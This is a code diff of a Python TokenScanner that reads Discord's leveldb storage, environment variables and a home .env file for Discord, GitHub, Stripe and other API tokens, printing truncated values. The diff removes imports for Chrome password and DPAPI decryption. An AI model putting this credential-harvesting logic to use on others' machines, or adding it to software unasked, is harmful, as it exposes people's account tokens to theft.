@@ -1,8 +1,8 @@
 import os
 import re
 import sqlite3
-from utils.path_utils import get_chrome_password_db, get_discord_storage_paths, is_windows
-from utils.crypto_utils import decrypt_windows_dpapi
+from utils.path_utils import get_discord_storage_paths, is_windows
+from pathlib import Path
 
 class TokenScanner:
     """Scan for Discord and API tokens"""
@@ -15,6 +15,24 @@ class TokenScanner:
         """Scan for Discord tokens in leveldb storage"""
         tokens = []
         
+        # Check environment variables first
+        token_from_env = os.getenv('DISCORD_TOKEN') or os.getenv('DISCORD_BOT_TOKEN')
+        if token_from_env and re.match(self.DISCORD_TOKEN_PATTERN, token_from_env):
+            tokens.append(f"ENV:DISCORD_TOKEN = {token_from_env[:20]}...")
+        
+        # Check .env files
+        env_file = Path.home() / '.env'
+        if env_file.exists():
+            try:
+                with open(env_file, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+                    if 'DISCORD_TOKEN' in content or 'BOT_TOKEN' in content:
+                        for match in re.findall(self.DISCORD_TOKEN_PATTERN, content):
+                            tokens.append(f".env:DISCORD_TOKEN = {match[:20]}...")
+            except:
+                pass
+        
+        # Check Discord leveldb storage
         for storage_path in get_discord_storage_paths():
             if not os.path.exists(storage_path):
                 continue
@@ -26,21 +44,18 @@ class TokenScanner:
                         try:
                             with open(filepath, 'rb') as f:
                                 content = f.read()
-                                
-                                # Try to decode as UTF-8
                                 try:
                                     decoded = content.decode('utf-8', errors='ignore')
                                 except:
                                     continue
                                 
-                                # Search for token patterns
                                 matches = re.findall(self.DISCORD_TOKEN_PATTERN, decoded)
                                 for match in matches:
-                                    if match not in tokens:
-                                        tokens.append(match)
-                        except Exception as e:
+                                    if match not in [t.split(' = ')[1].replace('...', '') for t in tokens if ' = ' in t]:
+                                        tokens.append(f"leveldb:{match[:20]}...")
+                        except:
                             pass
-            except Exception as e:
+            except:
                 pass
         
         return tokens
@@ -48,11 +63,11 @@ class TokenScanner:
     def scan_environment_tokens(self):
         """Scan environment variables for tokens"""
         tokens = []
-        token_env_vars = ['DISCORD_TOKEN', 'BOT_TOKEN', 'API_KEY', 'SECRET_KEY']
+        token_env_vars = ['DISCORD_TOKEN', 'BOT_TOKEN', 'API_KEY', 'SECRET_KEY', 'GITHUB_TOKEN', 'STRIPE_KEY']
         
         for var in token_env_vars:
             value = os.getenv(var)
-            if value and re.match(self.DISCORD_TOKEN_PATTERN, value):
-                tokens.append(f"{var}={value}")
+            if value and len(value) > 10:
+                tokens.append(f"{var}={value[:30]}...")
         
         return tokens
